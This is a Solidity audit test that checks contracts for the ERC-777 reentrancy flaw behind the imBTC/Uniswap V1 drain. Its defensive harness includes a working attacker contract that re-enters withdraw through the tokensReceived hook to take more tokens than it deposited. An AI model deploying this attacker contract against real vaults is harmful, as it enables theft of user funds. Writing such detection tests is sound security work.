// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../ChecklistBase.sol";
import "../examples/VulnerableERC777Vault.sol";

/// @title ERC777ReentrancyCheck — detect reentrancy via ERC-777 tokensReceived
/// @notice The same vulnerability class that drained imBTC/Uniswap V1 in 2020.
///         If the contract under audit moves ERC-777 tokens to a recipient
///         before settling its own accounting, a malicious recipient can
///         re-enter the call via `tokensReceived` and drain funds.
///
///         Override the protocol hooks below to point this check at your
///         contract: `getWithdrawCalldata`, `performDeposit`, and
///         `getERC777Token` (so the attacker uses the right token's hook).
/// @author kcolbchain
abstract contract ERC777ReentrancyCheck is ChecklistBase {
    /// @dev Calldata that triggers a withdrawal/transfer-out from the target
    function getWithdrawCalldata() internal view virtual returns (bytes memory);

    /// @dev The ERC-777-like token whose tokensReceived hook is exploited.
    ///      Must be a MockERC777Token (or any token routing tokensReceived).
    function getERC777Token() internal view virtual returns (MockERC777Token);

    /// @dev Amount deposited by the attacker for the test
    function getDepositValue() internal view virtual returns (uint256) {
        return 1 ether;
    }

    /// @dev Perform a deposit as `depositor` of `amount`. Override to match
    ///      your target's deposit flow (approve+pull, push, etc.).
    function performDeposit(address depositor, uint256 amount) internal virtual;

    function test_erc777_reentrancy_on_withdraw() public {
        bytes memory withdrawCall = getWithdrawCalldata();
        MockERC777Token token = getERC777Token();
        uint256 amount = getDepositValue();

        ERC777ReentrantAttacker attacker =
            new ERC777ReentrantAttacker(targetContract, withdrawCall);

        // Fund vault with enough tokens that a reentered withdraw can drain
        // more than the attacker deposited.
        token.mint(targetContract, amount * 3);

        // Attacker deposit. performDeposit must credit deposits[attacker] = amount.
        performDeposit(address(attacker), amount);

        uint256 attackerBalBefore = token.balanceOf(address(attacker));
        attacker.attack();
        uint256 attackerBalAfter = token.balanceOf(address(attacker));

        uint256 extracted = attackerBalAfter - attackerBalBefore;

        if (extracted > amount) {
            emit log_named_uint(
                unicode"VULNERABILITY: ERC-777 reentrancy drained extra tokens (wei)",
                extracted - amount
            );
            fail();
        }
    }
}

/// @dev Attacker contract. Re-enters `withdraw` via the tokensReceived hook.
contract ERC777ReentrantAttacker is IERC777Recipient {
    address public target;
    bytes public payload;
    uint256 public reentries;
    uint256 public maxReentries = 2;

    constructor(address _target, bytes memory _payload) {
        target = _target;
        payload = _payload;
    }

    function attack() external {
        (bool ok,) = target.call(payload);
        ok;
    }

    function tokensReceived(
        address, address, address, uint256, bytes calldata, bytes calldata
    ) external override {
        if (reentries < maxReentries) {
            reentries++;
            (bool ok,) = target.call(payload);
            ok; // ignore — the test asserts via final balance, not call success
        }
    }
}
